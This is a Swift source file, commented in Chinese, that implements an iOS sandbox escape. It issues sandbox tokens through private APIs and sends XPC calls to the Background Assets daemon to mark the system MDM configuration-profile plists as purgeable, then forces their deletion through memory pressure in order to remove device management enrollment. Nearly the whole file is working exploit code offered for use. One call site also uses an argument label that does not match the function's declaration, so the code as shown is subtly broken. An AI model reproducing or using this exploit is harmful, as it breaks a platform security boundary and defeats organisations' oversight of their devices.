//
//  BAPurge.swift
//  Background Assets (BA) purgeable MDM removal
//
//  机制（从 BASandboxEscape 还原）：
//   1. sandbox_extension_issue_file_to_self 为目标路径签发 sandbox token
//   2. NSXPCConnection 到 com.apple.backgroundassets.user (BA daemon)
//   3. markPurgeableWithFileURL:sandboxToken:reply: 把文件标记为 purgeable
//      —— BA daemon 以其权限代为操作，突破 App 沙箱
//   4. 制造内存压力，系统回收 purgeable 文件 -> MDM plist 消失
//

import Foundation
import UIKit

// MARK: - 私有 API

private typealias IssueFileToSelf = @convention(c) (UnsafePointer<CChar>) -> UnsafeMutablePointer<CChar>?
private typealias IssueFile       = @convention(c) (UnsafePointer<CChar>, Int32) -> UnsafeMutablePointer<CChar>?
private typealias ConsumeToken    = @convention(c) (UnsafePointer<CChar>) -> Int64
private typealias ReleaseToken    = @convention(c) (Int64) -> Int32

// MARK: - 目标

enum MDMPath {
    static let dir = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles"
    static let files = [
        "CloudConfigurationDetails.plist",
        "MDM.plist",
        "MCProfileEvents.plist",
        "MDMEvents.plist",
        "ProfileTruth.plist",
        "SharedDeviceConfiguration.plist",
    ]
}

// MARK: - BA XPC 协议（按还原的方法签名声明）

@objc protocol BADownloadManagerSyncProtocol {
    func syncDownloads(_ downloads: [Any])
    func removeDownloadIdentifier(_ identifier: String)
    func downloadIdentifierDidBegin(_ identifier: String)
    func downloadIdentifierDidPause(_ identifier: String)
}

@objc protocol BAAgentClientXPCProtocol {
    func markPurgeable(withFileURL url: URL, sandboxToken: String, reply: @escaping (Bool, Error?) -> Void)
}

// App 侧回调 stub（BA daemon 会回调这些方法）
final class BACallbackStub: NSObject, BADownloadManagerSyncProtocol {
    func syncDownloads(_ downloads: [Any]) { BAPurge.log("(ba) syncDownloads: \(downloads.count)") }
    func removeDownloadIdentifier(_ identifier: String) { BAPurge.log("(ba) removeDownloadIdentifier: \(identifier)") }
    func downloadIdentifierDidBegin(_ identifier: String) { BAPurge.log("(ba) didBegin: \(identifier)") }
    func downloadIdentifierDidPause(_ identifier: String) { BAPurge.log("(ba) didPause: \(identifier)") }
}

// MARK: - 主逻辑

final class BAPurge {

    static let shared = BAPurge()
    private init() {}

    static var onLog: ((String) -> Void)?

    static func log(_ s: String) {
        print(s)
        onLog?(s)
    }

    // MARK: 沙箱 token

    /// 为目标路径签发 sandbox extension token（给自己）
    private func issueToken(path: String) -> String? {
        guard let handle = dlopen(nil, RTLD_NOW) else { return nil }

        // 优先 to_self
        if let sym = dlsym(handle, "sandbox_extension_issue_file_to_self") {
            let fn = unsafeBitCast(sym, to: IssueFileToSelf.self)
            if let cstr = fn(path) {
                let token = String(cString: cstr)
                BAPurge.log("(bq) to_self 成功: \(path)")
                return token
            }
            BAPurge.log("(bq) to_self 返回 nil")
        } else {
            BAPurge.log("(bq) 未找到 sandbox_extension_issue_file_to_self")
        }

        // 回退：issue_file(path, pid) —— 给自己（getpid）
        if let sym2 = dlsym(handle, "sandbox_extension_issue_file") {
            let fn2 = unsafeBitCast(sym2, to: IssueFile.self)
            if let cstr = fn2(path, getpid()) {
                let token = String(cString: cstr)
                BAPurge.log("(bq) issue_file 成功: \(path)")
                return token
            }
            BAPurge.log("(bq) issue_file 返回 nil")
        } else {
            BAPurge.log("(bq) 未找到 sandbox_extension_issue_file")
        }
        return nil
    }

    /// consume token，扩大本进程沙箱
    @discardableResult
    private func consume(_ token: String) -> Int64 {
        guard let handle = dlopen(nil, RTLD_NOW),
              let sym = dlsym(handle, "sandbox_extension_consume") else { return -1 }
        let fn = unsafeBitCast(sym, to: ConsumeToken.self)
        let h = fn(token)
        BAPurge.log("(bq) consume -> \(h)")
        return h
    }

    // MARK: XPC 到 BA daemon

    private func callBAMarkPurgeable(fileURL: URL, token: String) {
        let serviceName = "com.apple.backgroundassets.user"
        let conn = NSXPCConnection(machServiceName: serviceName)
        conn.remoteObjectInterface = NSXPCInterface(with: BAAgentClientXPCProtocol.self)
        conn.exportedInterface = NSXPCInterface(with: BADownloadManagerSyncProtocol.self)
        conn.exportedObject = BACallbackStub()
        conn.invalidationHandler = { BAPurge.log("(xpc) 连接失效") }
        conn.interruptionHandler  = { BAPurge.log("(xpc) 连接中断") }
        conn.resume()

        let proxy = conn.remoteObjectProxyWithErrorHandler { err in
            BAPurge.log("(xpc) 错误: \(err)")
        } as? BAAgentClientXPCProtocol

        guard let proxy else {
            BAPurge.log("(xpc) 无法获得 remoteObjectProxy")
            return
        }

        BAPurge.log("(xpc) 调用 markPurgeableWithFileURL: \(fileURL.path)")
        proxy.markPurgeable(withFileURL: fileURL, sandboxToken: token) { ok, err in
            if let err { BAPurge.log("(xpc) markPurgeable 失败: \(err)") }
            else       { BAPurge.log("(xpc) markPurgeable 返回 ok=\(ok)") }
        }
    }

    // MARK: 内存压力（触发系统回收 purgeable 文件）

    private func applyMemoryPressure() {
        BAPurge.log("(mem) 开始制造内存压力…")
        var buffers: [UnsafeMutableRawPointer] = []
        let chunk = 8 * 1024 * 1024
        for _ in 0..<64 {
            let p = malloc(chunk)
            if let p {
                memset(p, 0xAB, chunk)
                buffers.append(p)
            } else { break }
        }
        BAPurge.log("(mem) 已分配 \(buffers.count * chunk / 1024 / 1024) MB")
        Thread.sleep(forTimeInterval: 1.5)
        for p in buffers { free(p) }
        BAPurge.log("(mem) 已释放")
    }

    // MARK: 一键执行

    func run() {
        let fm = FileManager.default
        BAPurge.log("(mdm) === 开始 BA purgeable MDM 移除 ===")
        BAPurge.log("(mdm) 目录: \(MDMPath.dir)")

        guard let token = issueToken(path: MDMPath.dir) else {
            BAPurge.log("(mdm) 无法签发沙箱 token —— 请查看日志")
            return
        }
        consume(token)

        // 记录操作前状态
        for f in MDMPath.files {
            let p = (MDMPath.dir as NSString).appendingPathComponent(f)
            BAPurge.log("(mdm) 操作前 \(f): \(fm.fileExists(atPath: p) ? "存在" : "不存在")")
        }

        // 逐个标记 purgeable
        for f in MDMPath.files {
            let p = (MDMPath.dir as NSString).appendingPathComponent(f)
            guard fm.fileExists(atPath: p) else { continue }
            let url = URL(fileURLWithPath: p)
            if let t = issueToken(path: p) {
                callBAMarkPurgeable(fileURL: url, sandboxToken: t)
            }
        }

        // 触发系统回收
        applyMemoryPressure()

        // 结果
        BAPurge.log("(mdm) === 结果 ===")
        for f in MDMPath.files {
            let p = (MDMPath.dir as NSString).appendingPathComponent(f)
            BAPurge.log("(mdm) \(f): \(fm.fileExists(atPath: p) ? "仍存在" : "已清除 ✓")")
        }
        BAPurge.log("(mdm) 完成。请 Respring 后检查 设置→通用→VPN与设备管理")
    }
}
